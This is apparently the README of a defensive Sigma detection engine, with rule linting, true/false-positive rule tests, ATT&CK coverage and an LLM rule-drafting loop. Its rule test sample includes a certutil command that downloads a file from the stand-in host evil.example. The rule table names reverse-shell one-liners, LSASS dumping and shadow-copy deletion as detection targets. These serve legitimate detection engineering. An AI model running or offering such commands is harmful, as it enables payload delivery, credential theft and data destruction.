# detection-lab

A **Sigma-compatible detection-as-code engine** that treats detections like
software: every rule is linted, unit-tested against true-positive and
true-negative samples, mapped to MITRE ATT&CK for coverage and gap analysis,
and gated in CI. On top of that sits an **LLM rule-authoring agent** that
drafts new rules from an incident description and labelled events, then has
to get each draft past the same test harness before it is accepted.

```
             ┌───────────── detlab lint ──────────────┐
rules/*.yml ─┤                                        ├─▶ CI gate (GitHub Actions)
             └── detlab test ◀── rule_tests/*.yml ────┘
                     │
events.jsonl ─▶ detlab scan ─▶ ATT&CK-tagged alert timeline (text / JSON)
                     │
             detlab coverage ─▶ covered techniques per tactic + gap list
                                              │
incident notes + samples ─▶ detlab draft ─────┘ (fills the gaps)
```

## Why this exists

The other blue-team tools in this repo hard-code their detection logic in
Python. Real SOCs don't work that way: detections live in a shared,
vendor-neutral format (Sigma), are reviewed like code, and break the build
when they regress. This project shows that workflow end to end, and the
engine is written from scratch (YAML in, matches out) rather than wrapping
`pySigma`, to show I understand how the format actually behaves.

It also uses a third AI pattern in this repo. `ioc-triage-assistant` is RAG,
`recon-agent` is a plan-act-observe agent, and here the LLM sits inside a
**generate → verify → repair loop** where a deterministic oracle (the rule
test harness) decides whether its output is accepted.

## Features

**Engine (`detlab/matcher.py`, `detlab/condition.py`)**
- Sigma value modifiers: `contains`, `startswith`, `endswith`, `re`, `all`,
  `cidr`, `windash` (matches `-flag`, `/flag` and Unicode-dash variants), `exists`.
- Sigma wildcards (`*`, `?`, backslash escapes) with case-insensitive
  matching, `null` values, list-valued and nested (`process.name`) fields, keyword searches.
- A recursive-descent parser for conditions with correct precedence:
  `and`/`or`/`not`, parentheses, `1 of selection_*`, `all of them`
  (excluding `_private` selections, as the spec says), and lists of conditions.
- Log-source routing: events that declare a `_logsource` are only evaluated by
  rules for that product/category, so a Linux rule never fires on Windows telemetry.

**Rule hygiene (`detlab lint`)**
- Hard errors: unknown modifiers, undefined or unmatched selection references,
  invalid regex/CIDR, unsupported aggregations, non-UUID ids, bad levels,
  malformed ATT&CK tags.
- **Duplicate YAML keys are rejected.** Plain PyYAML silently keeps the last
  duplicate, so a selection with two `CommandLine|contains` lines quietly
  loses half its logic. That bug is easy to write and hard to spot.
- Warnings: unused selections, missing description/false-positives, techniques
  with no tactic tag. `--strict` makes warnings fail the build.

**Detection unit tests (`detlab test`)**
- Each `rule_tests/*.yml` lists events the rule *must* match and events it
  *must not* match. The run fails on misses, false positives, tests that
  point to no rule, or (with `--require-all`) rules that have no tests.

**ATT&CK coverage (`detlab coverage`)**
- Rolls rule tags up by tactic against a curated technique reference
  (`data/attack_techniques.json`) and lists the gaps.

**LLM rule authoring (`detlab draft`)**
- The LLM drafts a rule; `validate_candidate()` compiles it, lints it and runs it
  against the samples; concrete failures (`incorrectly matched true_negatives[0]`)
  are sent back for repair, up to `--max-iterations` times.
- If there is no API key, or every LLM draft fails, a **deterministic
  synthesizer** derives a rule from the samples. It anchors on the process
  image, then picks the command-line token that best separates positives from
  the negatives still matching. Tokens that respect word boundaries win, so
  you get `' cl '`, not an over-fitted `' cl s'`. It never builds logic on
  volatile fields (PIDs, hostnames, timestamps, hashes).

## Rule pack

Nine rules, each with passing TP/TN tests, covering an end-to-end intrusion:

| Rule | Level | ATT&CK |
|---|---|---|
| Office application spawning a shell or script host | high | T1566.001 |
| PowerShell launched with an encoded command (SCCM filtered) | high | T1059.001, T1027 |
| Certutil used to download a remote file | high | T1105 |
| Run-key persistence pointing at a user-writable path (OneDrive filtered) | high | T1547.001 |
| Scheduled task created pointing at a user-writable path | medium | T1053.005 |
| LSASS memory dump via `comsvcs.dll` MiniDump | critical | T1003.001, T1218.011 |
| Mshta executing remote or inline script | high | T1218.005 |
| Shadow copy / backup catalog deletion (vssadmin, wmic, wbadmin, PowerShell) | critical | T1490 |
| Linux reverse-shell one-liners (bash `/dev/tcp`, netcat `-e`, python/perl sockets) | critical | T1059.004 |

## Installation

```bash
cd detection-lab
pip install -e ".[dev]"       # engine + tests (only runtime dependency: PyYAML)
pip install -e ".[llm]"       # optional: LLM-driven rule drafting
```

## Usage

```bash
# Hunt through a timeline (exit code 1 when anything fires, so it can gate a pipeline)
detlab scan --rules rules --events samples/incident_timeline.jsonl
detlab scan --rules rules --events events.jsonl --min-level high --json --output alerts.json

# Detection-as-code checks
detlab lint --strict rules
detlab test --rules rules --tests rule_tests --require-all

# Where are we blind?
detlab coverage --rules rules

# Fill a gap: draft a rule from incident notes + labelled samples
detlab draft \
  --description samples/authoring/log_clearing_description.txt \
  --positives  samples/authoring/log_clearing_positives.jsonl \
  --negatives  samples/authoring/log_clearing_negatives.jsonl \
  --title "Event Log Cleared via Wevtutil" --level high \
  --tags attack.defense_evasion,attack.t1070.001 --out rules/new_rule.yml
```

`draft` uses the LLM when `ANTHROPIC_API_KEY` is set and the `llm` extra is
installed. Pass `--offline` to force the synthesizer.

### Example: reconstructing an intrusion

`samples/incident_timeline.jsonl` is a 15-event mixed Windows/Linux timeline:
a macro-laden invoice leads to ransomware staging on `WS-FIN-07` and a web-shell
reverse shell on `WEB-01`. It is interleaved with look-alike benign activity
(SCCM encoded PowerShell, `certutil -hashfile`, the OneDrive run key, an `nc -zv`
health check):

```
$ detlab scan --rules rules --events samples/incident_timeline.jsonl
Scanned 15 events with 9 rules -> 9 alert(s)

By level: critical=4, high=4, medium=1

Timeline:
  2026-11-20T09:12:09Z  WS-FIN-07  [HIGH    ] Office Application Spawning a Shell or Script Host  (T1566.001)
  2026-11-20T09:12:10Z  WS-FIN-07  [HIGH    ] PowerShell Launched With Encoded Command  (T1027,T1059.001)
  2026-11-20T09:13:44Z  WS-FIN-07  [HIGH    ] Certutil Used to Download a Remote File  (T1105)
  2026-11-20T09:14:02Z  WS-FIN-07  [HIGH    ] Run Key Persistence Pointing at a User-Writable Location  (T1547.001)
  2026-11-20T09:15:30Z  WS-FIN-07  [MEDIUM  ] Scheduled Task Created Pointing at a User-Writable Path  (T1053.005)
  2026-11-20T09:21:17Z  WS-FIN-07  [CRITICAL] LSASS Memory Dump via Comsvcs MiniDump  (T1003.001,T1218.011)
  2026-11-20T09:40:03Z  WS-FIN-07  [CRITICAL] Shadow Copy or Backup Catalog Deletion  (T1490)
  2026-11-20T09:40:05Z  WS-FIN-07  [CRITICAL] Shadow Copy or Backup Catalog Deletion  (T1490)
  2026-11-20T10:02:11Z  WEB-01     [CRITICAL] Linux Reverse Shell One-Liner  (T1059.004)
```

None of the four benign look-alikes fire. `detlab coverage` then reports
`T1070.001 Clear Windows Event Logs` as a gap, and `detlab draft` closes it:

```
$ detlab draft --offline ... --title "Event Log Cleared via Wevtutil"
  attempt 1 [synthesizer]: accepted
...
detection:
  selection:
    Image|endswith: \wevtutil.exe
    CommandLine|contains: ' cl '
  condition: selection
```

That rule matches `wevtutil cl Security/System/"Windows PowerShell"`. It does
not match `wevtutil qe`, `wevtutil gl`, or a `cmd /c echo cl ...` decoy.

## Writing a rule test

```yaml
# rule_tests/certutil_download.yml
rule_id: e5221b69-14e9-4024-8724-74f34f1a2a1a
true_positives:
  - Image: 'C:\Windows\System32\certutil.exe'
    CommandLine: 'certutil /urlcache /f https://evil.example/stage2.dll stage2.dll'
true_negatives:
  - Image: 'C:\Windows\System32\certutil.exe'
    CommandLine: 'certutil -hashfile C:\temp\installer.msi SHA256'
```

## Testing

```bash
pytest -q        # 94 tests, offline; the LLM loop is exercised with a scripted fake client
```

The suite covers modifier and wildcard semantics, condition precedence, linter
rules, log-source routing, the test harness, coverage maths, the
repair-feedback loop (a rejected draft's errors must appear in the next
prompt), LLM-failure fallback, the synthesizer, and every CLI subcommand.
`tests/test_shipped_rules.py` also guards the rule pack: it must lint clean,
pass all its tests, and reconstruct the sample kill chain without firing
on the benign look-alikes.

CI (`.github/workflows/detection-lab.yml`) runs the unit tests, `lint
--strict`, `test --require-all`, and writes the ATT&CK coverage report to
the job summary.

## Scope and limitations

- Supports the Sigma *detection* subset used by most endpoint rules.
  Correlation/aggregation rules (`count()`, `timeframe`) are rejected with a
  clear error instead of being silently mis-evaluated.
- No field-mapping/backends: events are expected to use Sigma field names
  (Sysmon-style `Image`, `CommandLine`, `ParentImage`, …). The engine
  evaluates rules in Python and does not convert them to SIEM queries.
- Synthesized rules are a starting point for an analyst, not an
  auto-deploy. They are marked `status: experimental` with a review note.

## Project layout

```
detection-lab/
├── detlab/
│   ├── matcher.py     # field modifiers, wildcards, selections
│   ├── condition.py   # condition tokenizer, parser, evaluator
│   ├── rules.py       # YAML loading (strict), compilation, linter
│   ├── engine.py      # event loading, log-source routing, scanning
│   ├── testing.py     # TP/TN detection unit-test harness
│   ├── coverage.py    # ATT&CK coverage + gaps
│   ├── author.py      # LLM generate-verify-repair loop + synthesizer
│   └── cli.py
├── rules/             # Sigma rule pack
├── rule_tests/        # TP/TN samples per rule
├── data/attack_techniques.json
├── samples/           # incident timeline + authoring example
└── tests/
```
